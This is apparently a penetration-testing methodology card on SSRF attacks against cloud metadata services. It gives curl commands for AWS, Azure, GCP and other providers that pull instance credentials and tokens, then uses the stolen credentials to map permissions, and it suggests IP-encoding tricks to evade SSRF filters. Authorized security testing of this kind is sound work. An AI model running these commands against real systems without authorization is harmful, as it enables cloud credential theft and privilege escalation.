# Cloud, Container, Kubernetes, And SaaS Operations: Attack Primitives: Metadata Service

> Apply [../module-continuity.md](../module-continuity.md). Inherit the engagement, parent path, current capability, evidence, authorization profile, and module stack. Do not initialize a separate workflow. Checkpoint material results and return them to the parent path before leaving this card.

## Attack Primitives: Metadata Service

The cloud metadata endpoint (169.254.169.254 and equivalents) is a high-value SSRF target. Exploitation proceeds through four distinct stages — each must be verified independently. Reaching the endpoint does not mean you have usable credentials; having credentials does not mean they grant useful permissions.

### Four-Stage Progression

| Stage | What It Means | Verification |
|---|---|---|
| **1. Reach the metadata endpoint** | The exploited host can make HTTP requests to 169.254.169.254 | HTTP response from the metadata service (200 with metadata content, or 401/403 indicating a version or header requirement) |
| **2. Obtain a credential** | The metadata service returned an access key, secret, token, or JWT | The response contains a valid credential structure (AWS: `AccessKeyId` + `SecretAccessKey` + `Token`; Azure: `access_token` JWT; GCP: OAuth token) |
| **3. The credential has effective permissions** | The credential grants access to cloud APIs beyond the current context | Use the credential to call a cloud API (`get-caller-identity`, list resources, read a known-existing object). A credential that exists but has no IAM permissions attached is not an escalation |
| **4. The credential enables a cross-domain path** | The permissions are sufficient to reach a new identity, account, data store, or control plane that was not reachable before | Map the credential's effective permissions; identify whether it can assume another role, access another account/subscription/project, read sensitive data, or modify infrastructure |

**Key judgment**: Stage 1 or 2 alone is not a finding. A metadata endpoint that returns credentials is working as designed. The finding is at Stage 3 (credential has excessive permissions) or Stage 4 (cross-domain path exists).

### AWS IMDS (Instance Metadata Service)

```
# Stage 1: Reach the endpoint
# IMDSv1
curl http://169.254.169.254/latest/meta-data/
# Returns: list of metadata paths — Stage 1 confirmed

# IMDSv2
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -s)
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# Stage 2: Obtain credential
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# Returns: AccessKeyId, SecretAccessKey, Token, Expiration

# Stage 3: Test effective permissions
aws sts get-caller-identity --profile stolen_creds
aws iam list-attached-role-policies --role-name <role_name>
aws iam simulate-principal-policy --policy-source-arn <role_arn> --action-names "s3:ListBucket","ec2:DescribeInstances","iam:CreateUser"

# Stage 4: Cross-domain path analysis → see cloud-container-04 (IAM escalation)
```

**IMDSv1 vs v2**: IMDSv1 (simple GET) is reachable from any SSRF that can make HTTP GET requests. IMDSv2 requires a PUT request with the `X-aws-ec2-metadata-token-ttl-seconds` header — reachable only from SSRF vectors that support PUT with custom headers, or from code execution on the instance itself. Check the IMDS version from the SSRF context:
```bash
curl -s -o /dev/null -w "%{http_code}" http://169.254.169.254/latest/meta-data/
# 200 = v1 enabled (reachable via SSRF GET)
# 401 or timeout = v2 required (SSRF may need PUT + header capability)
```

### Azure IMDS

```
# Stage 1-2 combined: Azure always requires Metadata:true header
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# Returns: access_token (JWT) — decode to see tid (tenant), oid (object ID), appid

# Stage 3: Use the token
curl -H "Authorization: Bearer <token>" "https://management.azure.com/subscriptions?api-version=2021-04-01"
# The resource parameter in the token request determines which service the token is valid for
# Token for management.azure.com ≠ token for storage.azure.com ≠ token for vault.azure.net
```

### GCP Metadata

```
# Stage 1-2: GCP requires Metadata-Flavor header
curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/"
curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
# GCP also reachable via metadata.google.internal (DNS)

# Stage 3: Check token scopes — the token only has access to services matching the granted scopes
curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes"
# A token with only storage.read scope cannot call compute or IAM APIs regardless of IAM roles
```

### Other Cloud Providers

```
# DigitalOcean
curl http://169.254.169.254/metadata/v1.json

# Alibaba Cloud
curl http://100.100.100.200/latest/meta-data/

# Tencent Cloud
curl http://metadata.tencentyun.com/latest/meta-data/

# OpenStack
curl http://169.254.169.254/openstack/latest/meta_data.json
```

### Metadata Failure Branches

| Failure | Stage | Next Action |
|---|---|---|
| Metadata endpoint returns timeout or connection refused | Stage 1 | The exploited host is not a cloud workload, or the metadata endpoint is firewalled, or the SSRF primitive cannot reach link-local addresses. Test alternative IP encodings (decimal, hex, IPv6) to bypass naive filters. |
| Endpoint reached but returns 401/403 | Stage 1 → 2 blocked | IMDSv2 required (AWS) or header missing (Azure/GCP). Check whether the SSRF primitive supports PUT requests or custom headers. If not, the path stops at Stage 1 — record that the host is a cloud workload but the credential cannot be retrieved from this SSRF vector. |
| Credential obtained but API returns AccessDenied for all calls | Stage 3 | The credential's attached IAM roles/policies have no permissions, or an SCP/org policy denies all actions. This is a dead end for escalation but confirms the workload identity exists. |
| Credential has permissions but only to the current account and no cross-account or privilege path exists | Stage 4 blocked | Record the effective permissions. The finding may be that the instance role has excessive permissions (e.g., full S3 access) even if no further escalation exists. |
| Token expired or scope mismatch (Azure/GCP) | Stage 2 → 3 | Request a new token with the correct resource/scope parameter. For Azure, verify which resource the token was requested for; a token for storage.azure.com cannot call management.azure.com. |


## Card Exit

Classify the result, update evidence and attempted methods, record capability or risk changes, identify affected paths, and apply the return contract in [../module-continuity.md](../module-continuity.md).
